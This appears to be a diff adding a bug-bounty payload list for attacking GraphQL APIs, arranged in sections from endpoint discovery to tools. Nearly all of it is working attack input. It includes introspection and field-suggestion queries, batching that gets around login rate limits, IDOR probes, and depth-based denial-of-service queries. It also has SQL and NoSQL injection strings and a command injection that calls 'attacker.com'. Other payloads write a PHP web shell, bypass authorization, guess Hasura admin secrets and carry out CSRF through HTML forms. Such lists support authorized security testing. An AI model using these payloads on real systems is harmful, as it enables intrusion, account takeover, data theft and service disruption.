@@ -1,0 +1,222 @@
+# GraphQL Attack Payloads — Bug Bounty Edition
+# Sources: PayloadsAllTheThings, G8KEPR, bugbounty.info, PortSwigger, real H1/BC writeups
+# Categories: Introspection, Batching, Injection, Auth Bypass, CSRF, DoS, Subscriptions
+
+# ============================================================
+# SECTION 1: ENDPOINT DISCOVERY
+# ============================================================
+# Common GraphQL endpoints:
+#   /graphql, /graph, /gql, /query, /api, /api/graphql, /v1/graphql
+#   /graphiql, /playground, /voyager, /altair
+#   /console, /dashboard, /admin
+# Check JS files for references to "createHttpLink", "ApolloClient", "graphql"
+
+# ============================================================
+# SECTION 2: INTROSPECTION QUERIES
+# ============================================================
+
+# --- Full Schema Introspection ---
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+          kind
+          ofType { name kind }
+        }
+      }
+    }
+  }
+}
+
+# --- Compact Schema Introspection ---
+{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}
+
+# --- Query Type Discovery ---
+{__schema{queryType{name fields{name}}}}
+
+# --- Mutation Type Discovery ---
+{__schema{mutationType{name fields{name args{name type{name kind}}}}}}
+
+# --- Subscription Type Discovery ---
+{__schema{subscriptionType{name fields{name}}}}
+
+# --- Enum Values ---
+{__type(name:"Role"){enumValues{name}}}
+
+# --- Introspection via Query Batching (bypasses disabled introspection) ---
+query a{__typename}
+query b{__schema{types{name}}}
+
+# ============================================================
+# SECTION 3: FIELD SUGGESTIONS (when introspection disabled)
+# ============================================================
+
+# --- Probe with wrong field names to get suggestions ---
+{ utilizr { id } }         # → "Did you mean 'user'?"
+{ prijects { name } }      # → "Did you mean 'projects'?"
+# Tool: Clairvoyance automates this schema recovery
+#   python3 clairvoyance.py -u https://target.com/graphql -o schema.json
+
+# ============================================================
+# SECTION 4: BATCHING / ALIAS ATTACKS
+# ============================================================
+
+# --- Batching for Rate Limit Bypass ---
+# Send multiple mutations in one request:
+[
+  {"query": "mutation { login(username: \"admin\", password: \"test1\") { token } }"},
+  {"query": "mutation { login(username: \"admin\", password: \"test2\") { token } }"},
+  {"query": "mutation { login(username: \"admin\", password: \"test3\") { token } }"},
+  ... (up to N requests in one HTTP POST)
+]
+
+# --- Alias-based Batching (same query, different args) ---
+query {
+  a1: login(username: "admin", password: "test1") { token }
+  a2: login(username: "admin", password: "test2") { token }
+  a3: login(username: "admin", password: "test3") { token }
+}
+
+# --- Alias for IDOR probing ---
+query {
+  me: user(id: 1) { email role }
+  other: user(id: 2) { email role }
+  admin: user(id: 3) { email role }
+}
+
+# ============================================================
+# SECTION 5: DEPTH / COMPLEXITY DOS ATTACKS
+# ============================================================
+
+# --- Circular Query (depth attack) ---
+query {
+  user(id: 1) {
+    friends { friends { friends { friends { friends { id name } } } } }
+  }
+}
+
+# --- Cart/Order Circular ---
+query {
+  user(id: 1) {
+    orders { products { reviews { user { orders { products { id } } } } } }
+  }
+}
+
+# --- Alias-based Amplification ---
+query {
+  a1: __typename
+  a2: __typename
+  ... (hundreds of aliases)
+  a999: __typename
+}
+
+# --- Introspection Amplification ---
+query {
+  __schema { types { name fields { name type { name kind ofType { name kind ofType { name kind } } } } } }
+}
+
+# ============================================================
+# SECTION 6: INJECTION VIA GRAPHQL
+# ============================================================
+
+# --- SQL Injection in GraphQL Args ---
+query {
+  user(id: "1' OR '1'='1") { email password }
+}
+
+query {
+  search(query: "'; DROP TABLE users; --") { results }
+}
+
+# --- NoSQL Injection in GraphQL ---
+query {
+  user(id: "{\"$ne\": \"\"}") { email }
+}
+
+query {
+  login(username: "admin", password: "{\"$ne\": \"\"}") { token }
+}
+
+# --- SSTI in GraphQL ---
+query {
+  render(template: "{{7*7}}") { output }
+}
+
+# --- OS Command Injection ---
+mutation {
+  runCommand(command: "id; curl http://attacker.com") { output }
+}
+
+# --- File Write via Mutation ---
+mutation {
+  saveFile(path: "/var/www/html/shell.php", content: "<?php system($_GET['c']); ?>") { success }
+}
+
+# ============================================================
+# SECTION 7: AUTHORIZATION BYPASS
+# ============================================================
+
+# --- Nested Resolver Bypass ---
+# Direct query blocked:
+#   query { adminUsers { id email } }  → 403
+# But nested access works:
+query {
+  me { friends { adminNotes } }
+}
+
+query {
+  post(id: "123") { author { role internalFlags } }
+}
+
+# --- IDOR via GraphQL Nested Query ---
+query {
+  user(id: 1) { orders { id total } }
+  user(id: 2) { orders { id total } }
+  user(id: 3) { orders { id total } }
+}
+
+# --- Missing Auth Check on Mutations ---
+mutation {
+  deleteUser(id: 5) { success }
+  updateUserRole(id: 1, role: admin) { user { role } }
+}
+
+# --- Hasura Admin Secret Check ---
+# Try empty / common secrets:
+#   x-hasura-admin-secret: (empty)
+#   x-hasura-admin-secret: admin
+#   x-hasura-admin-secret: secret
+#   x-hasura-admin-secret: hasura
+
+# ============================================================
+# SECTION 8: CSRF VIA GRAPHQL
+# ============================================================
+# GraphQL endpoints that accept GET (query only) or no CSRF token in POST:
+#   <img src="https://target.com/graphql?query={user(id:1){email}}">
+#   <form action="https://target.com/graphql" method="POST">
+#     <input type="text" name="query" value="mutation{changeEmail(email:'attacker@test.com'){id}}">
+#   </form>
+
+# ============================================================
+# SECTION 9: SUBSCRIPTION ATTACKS
+# ============================================================
+# WebSocket-based subscriptions (check if WS is authenticated):
+#   wss://target.com/graphql/subscriptions
+# Subscribe to sensitive events:
+subscription {
+  userUpdated { id email role }
+  orderPlaced { id total items }
+}
+
+# ============================================================
+# SECTION 10: GRAPHQL TOOLS
+# ============================================================
+# graphw00f:     python3 graphw00f.py -d -t https://target.com/graphql
+# InQL:          Burp Suite extension
+# Clairvoyance:  python3 clairvoyance.py -u https://target.com/graphql -o schema.json
+# GraphQL Voyager: Visualize schema
+# GraphQL Cop:   python3 graphql-cop.py -t https://target.com/graphql
